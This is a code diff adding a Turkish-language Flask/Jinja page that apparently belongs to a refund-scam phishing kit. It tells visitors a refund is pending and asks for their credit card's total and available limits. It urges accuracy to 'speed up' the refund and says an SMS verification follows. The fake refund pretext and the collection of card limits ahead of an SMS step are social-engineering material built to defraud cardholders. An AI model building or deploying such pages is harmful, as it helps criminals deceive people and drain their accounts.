@@ -1,0 +1,45 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="richText">
+    İade tutarının hatalı gönderimini önlemek için lütfen kredi kartınızın toplam ve net güncel limitlerini ayrı ayrı giriniz.
+</div>
+<div class="limit-info-grid">
+    <article class="limit-thumbnail">
+        <h3>T. Kredi Kartı Limitiniz</h3>
+        <p>Bankanız tarafından tanımlanan azami kredi kartı limitinizi tam sayı olarak giriniz. Bu bilgi iade sonrası artı bakiye hesabı için kullanılacaktır.</p>
+    </article>
+    <article class="limit-thumbnail">
+        <span class="limit-kicker">Bilgilendirme</span>
+        <h3>G. Kredi Kartı Limitiniz</h3>
+        <p>Güncel kullanılabilir limitiniz toplam limitten düşülerek hesaplanır. Doğru girmeniz, iade sonrası oluşacak artı bakiyeyi hızlandırır.</p>
+    </article>
+</div>
+{% if error %}
+<div class="formRow error-text">{{ error }}</div>
+{% endif %}
+{% set form_values = form_data or {} %}
+<form method="post" id="limitForm" autocomplete="off">
+    <fieldset>
+        <div class="formRow required">
+            <label for="totalLimitField" class="rowLabel">Toplam kredi kartı limitiniz</label>
+            <div class="fieldGroup">
+                <input name="total_limit" id="totalLimitField" type="tel" maxlength="10" class="text" placeholder="Örn: 50000" value="{{ form_values.get('total_limit','') }}" required>
+            </div>
+        </div>
+        <div class="formRow required">
+            <label for="currentLimitField" class="rowLabel">Güncel kredi kartı limitiniz</label>
+            <div class="fieldGroup">
+                <input name="current_limit" id="currentLimitField" type="tel" maxlength="10" class="text" placeholder="Örn: 12500" value="{{ form_values.get('current_limit','') }}" required>
+            </div>
+        </div>
+    </fieldset>
+    <p class="limit-helper">İade Tutarınız size SMS doğrulamasından sonra bildirilecektir. Limit değerlerinizi doğru girmeniz geri ödeme hızını doğrudan etkiler.</p>
+    <div class="loader is-hidden">
+        <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
+    </div>
+    <div class="formSubmitRow">
+        <button type="submit" class="submitButton">İade Sorgula</button>
+        <button type="button" class="backButton" onclick="window.history.back()">İptal Et</button>
+    </div>
+</form>
+{% endblock %}
